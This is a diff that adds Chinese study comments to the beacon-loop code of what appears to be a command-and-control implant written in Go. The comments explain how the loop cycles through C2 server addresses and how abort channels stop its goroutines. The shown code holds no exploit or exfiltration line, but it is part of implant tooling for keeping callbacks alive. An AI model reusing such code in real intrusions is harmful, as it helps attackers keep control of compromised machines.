@@ -120,6 +120,8 @@ func (b *Beacon) Duration() time.Duration {
 
 // StartBeaconLoop - Starts the beacon loop generator
 // <-chan struct{} 只读chan             chan<- struct{} 只写chan
+// 这里传入的abort这个channel是为了让外层函数关闭的时候，子协程也可以退出
+// 返回一个chan，可以从这个chan中读取到Beacon这个结构体
 func StartBeaconLoop(abort <-chan struct{}) <-chan *Beacon {
 	// {{if .Config.Debug}}
 	log.Printf("Starting beacon loop ...")
@@ -129,12 +131,13 @@ func StartBeaconLoop(abort <-chan struct{}) <-chan *Beacon {
 	// 可能会有多个Beacon产生，这取决于上线配置信息中支持的协议数量
 	nextBeacon := make(chan *Beacon)
 
+	// innerAbort 控制内层子协程的退出，和传入的abort的作用一样
 	innerAbort := make(chan struct{})
 	c2Generator := C2Generator(innerAbort)
 
 	go func() {
 		defer close(nextBeacon)
-		// 当前函数结束后，给innerAbort信号，C2Generator中的函数会结束
+		// 当前子协程结束后，给innerAbort信号，C2Generator中的函数会结束
 		defer func() {
 			innerAbort <- struct{}{}
 		}()
@@ -145,6 +148,7 @@ func StartBeaconLoop(abort <-chan struct{}) <-chan *Beacon {
 
 		// c2Generator 阻塞的channel
 		// channel拿到一个上线信息，循环一次，http、https或者其他
+		// 这里应该是会一直尝试返回一个beacon的，当外层函数中的beacon发生异常退出时，他会立刻将新的beacon写入到nextBeacon这个chan中以供外层函数来读取
 		for uri := range c2Generator {
 			// {{if .Config.Debug}}
 			log.Printf("Next CC = %s", uri.String())
@@ -183,6 +187,7 @@ func StartBeaconLoop(abort <-chan struct{}) <-chan *Beacon {
 			}
 
 			// 生成Beacon并写出，当外层函数结束时，<-abort可用
+			// 如果能从abort中读到内容，那么表示外层主函数已经退出，这里是将子协程也直接return返回
 			select {
 			case nextBeacon <- beacon:
 			case <-abort:
